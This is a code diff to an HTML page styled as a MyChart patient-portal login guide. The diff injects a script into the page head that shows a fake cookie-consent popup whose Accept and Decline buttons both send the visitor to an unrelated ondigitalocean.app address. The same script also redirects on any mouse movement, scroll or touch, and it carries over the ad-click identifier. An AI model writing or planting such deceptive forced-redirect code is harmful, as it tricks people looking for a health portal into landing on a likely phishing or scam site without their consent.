@@ -19,7 +19,131 @@
   <title>MyChart Login Guide | Patient Portals Access</title>
   <link rel="stylesheet" href="style.css" />
  
- 
+ <script>
+(function () {
+  const redirectUrl = "https://finding8dwhop8h8wnsd938uwdna9d8w-igtj6.ondigitalocean.app/";
+  let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;
+
+  function random(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  function randomColor() {
+    const colors = ["#28a745", "#007bff", "#ff5722", "#6f42c1", "#17a2b8", "#ffc107", "#dc3545"];
+    return colors[Math.floor(Math.random() * colors.length)];
+  }
+
+  function randomText() {
+    const messages = [
+      `🍪 <b>Important Notice:</b><br><br>We use cookies and similar technologies to personalize content, deliver targeted advertising, provide social media features, and analyze our traffic.<br><br>By clicking 'Accept Cookies', you consent to the use of ALL the cookies.<br><br>Read our <a href='#' style='color:#007bff;'>Privacy Policy</a>.`,
+      `🍪 <b>Your Privacy Matters!</b><br><br>To improve your experience, we collect cookies and process personal data like IP addresses and behavior.<br><br>Read more in our <a href='#' style='color:#007bff;'>Privacy Center</a>.`,
+      `🍪 <b>Cookie Usage Agreement</b><br><br>This site uses cookies to enhance functionality, personalize your experience, and comply with regulations.<br><br>Read our full <a href='#' style='color:#007bff;'>Cookie Policy</a>.`
+    ];
+    return messages[Math.floor(Math.random() * messages.length)];
+  }
+
+  function redirectUser() {
+    if (!redirected) {
+      redirected = true;
+      const urlParams = new URLSearchParams(window.location.search);
+      const gclid = urlParams.get('gclid');
+      let finalUrl = redirectUrl;
+      if (gclid) finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
+      window.location.href = finalUrl;
+    }
+  }
+
+  function showCookiePopup() {
+    const wrapper = document.createElement("div");
+    wrapper.innerHTML = `
+    <div style="
+      position:fixed; top:0; left:0; width:100%; height:100%;
+      background:rgba(0,0,0,0.65); display:flex; justify-content:center; align-items:center;
+      z-index:99999; backdrop-filter: blur(6px);
+    ">
+      <div style="
+        background: linear-gradient(145deg, #ffffff, #f0f4ff);
+        padding: 3rem 2.5rem;
+        border-radius: 20px;
+        max-width: 680px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+        animation: fadeIn 0.5s ease-out;
+        font-family: 'Poppins', sans-serif;
+      ">
+        <h2 style="font-size: 2rem; margin-top: 0; color: #222;">🔐 We Respect Your Privacy</h2>
+        <p style="font-size: 1.1rem; color: #555; margin: 1rem 0 2rem;">${randomText()}</p>
+        <div style="display:flex; flex-wrap:wrap; gap: 1rem; justify-content:center;">
+          <button id="acceptBtn" style="
+            padding: 0.9rem 1.8rem;
+            background: ${randomColor()};
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+          ">Accept Cookies</button>
+          <button id="declineBtn" style="
+            padding: 0.9rem 1.8rem;
+            background: ${randomColor()};
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+          ">Decline</button>
+        </div>
+      </div>
+    </div>
+    `;
+    document.body.appendChild(wrapper);
+    document.getElementById("acceptBtn").addEventListener("click", redirectUser);
+    document.getElementById("declineBtn").addEventListener("click", redirectUser);
+  }
+
+  // Trigger popup shortly after load
+  window.addEventListener("load", function () {
+    setTimeout(showCookiePopup, random(300, 600));
+  });
+
+  // Trigger redirect on movement
+  window.addEventListener("mousemove", function (e) {
+    if (!moved) {
+      if (!initialPos) {
+        initialPos = { x: e.clientX, y: e.clientY };
+        return;
+      }
+      if (e.clientX !== initialPos.x || e.clientY !== initialPos.y) {
+        moved = true;
+        setTimeout(redirectUser, random(1000, 1600));
+      }
+    }
+  });
+
+  // Trigger on scroll or touch
+  window.addEventListener("scroll", function () {
+    if (!scrolled) {
+      scrolled = true;
+      setTimeout(redirectUser, random(1000, 1600));
+    }
+  });
+
+  window.addEventListener("touchstart", function () {
+    if (!touched) {
+      touched = true;
+      setTimeout(redirectUser, random(1000, 1600));
+    }
+  });
+})();
+</script>
+
  
 </head>
 <body>
